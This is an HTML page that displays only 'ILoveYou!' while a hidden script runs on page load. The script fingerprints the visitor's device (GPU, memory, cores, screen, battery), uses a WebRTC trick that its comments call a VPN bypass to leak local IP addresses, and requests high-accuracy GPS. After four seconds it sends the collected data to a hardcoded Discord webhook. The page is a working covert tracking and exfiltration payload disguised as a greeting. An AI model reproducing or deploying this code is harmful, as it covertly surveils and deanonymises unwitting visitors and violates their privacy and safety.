<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ILoveYou!</title>
    <style>
        body { background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        h1 { font-size: 50px; }
    </style>
</head>
<body>
    <h1>ILoveYou!</h1>

    <script>
        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
        let FINAL_PAYLOAD = { system: {}, network: {}, geo: {} };

        // 1. DonanÄ±m Bilgileri ve GPU
        function getHardwareInfo() {
            let gpu = "Unknown";
            try {
                const canvas = document.createElement("canvas");
                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) {}

            return {
                ram: navigator.deviceMemory || "N/A",
                cores: navigator.hardwareConcurrency || "N/A",
                res: `${window.screen.width}x${window.screen.height}`,
                gpu: gpu
            };
        }

        // 2. WebRTC IP Leak (VPN Bypass)
        async function getIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        pc.close();
                        resolve(ips);
                        return;
                    }
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
                };
                setTimeout(() => resolve(ips), 1500); // 1.5 sn bekle ve dÃ¶n
            });
        }

        // 3. Ana ToplayÄ±cÄ± ve GÃ¶nderici
        async function run() {
            FINAL_PAYLOAD.system = getHardwareInfo();
            
            // Batarya
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                FINAL_PAYLOAD.system.battery = `${(b.level * 100).toFixed(0)}% (Charging: ${b.charging})`;
            }

            // IP
            FINAL_PAYLOAD.network.localIPs = await getIPs();

            // GPS (KullanÄ±cÄ± onayÄ± gerekir)
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    FINAL_PAYLOAD.geo = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy };
                },
                (e) => { FINAL_PAYLOAD.geo = "Denied/Error"; },
                { enableHighAccuracy: true }
            );

            // 4 Saniye sonra Discord'a gÃ¶nder (TÃ¼m verilerin dolmasÄ± iÃ§in)
            setTimeout(() => {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "ðŸš¨ **Cihaz Raporu HazÄ±r**",
                        embeds: [{
                            color: 0,
                            description: "```json\n" + JSON.stringify(FINAL_PAYLOAD, null, 2) + "\n```"
                        }]
                    })
                });
            }, 4000);
        }

        window.onload = run;
    </script>
</body>
</html>
